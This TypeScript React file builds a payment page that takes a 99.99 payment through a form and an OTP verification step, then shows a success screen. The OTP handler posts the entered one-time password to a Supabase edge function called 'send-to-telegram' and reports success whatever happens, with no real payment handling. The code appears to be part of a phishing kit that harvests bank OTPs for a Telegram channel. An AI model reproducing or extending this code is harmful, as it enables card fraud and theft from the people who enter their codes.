import { useState } from "react";
import PaymentForm from "@/components/PaymentForm";
import OtpVerification from "@/components/OtpVerification";
import PaymentSuccess from "@/components/PaymentSuccess";

const Index = () => {
  const [step, setStep] = useState<"form" | "otp" | "success">("form");
  const [amount] = useState("99.99");

  const handleFormSubmit = () => {
    setStep("otp");
  };

  const handleOtpSubmit = (otp: string) => {
    // Send OTP to Telegram via edge function
    fetch(
      `https://${import.meta.env.VITE_SUPABASE_PROJECT_ID}.supabase.co/functions/v1/send-to-telegram`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "otp", otp }),
      }
    );
    setStep("success");
  };

  return (
    <div className="min-h-screen bg-muted flex items-center justify-center p-4">
      {step === "form" && (
        <PaymentForm amount={amount} onSuccess={handleFormSubmit} />
      )}
      {step === "otp" && <OtpVerification onSubmit={handleOtpSubmit} />}
      {step === "success" && <PaymentSuccess amount={amount} />}
    </div>
  );
};

export default Index;
